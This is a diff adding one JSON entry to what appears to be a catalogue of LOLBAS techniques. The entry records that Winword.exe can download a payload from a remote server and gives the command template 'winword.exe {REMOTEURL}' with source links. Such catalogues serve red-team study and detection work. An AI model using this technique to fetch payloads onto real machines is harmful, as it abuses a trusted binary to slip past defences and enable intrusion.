@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-winword-exe-download",
+  "name": "LOLBAS · Winword.exe (Download)",
+  "command": "winword.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "winword",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Winword/",
+  "upstream_id": "Winword.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Winword.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Winword/"
+    }
+  ]
+}
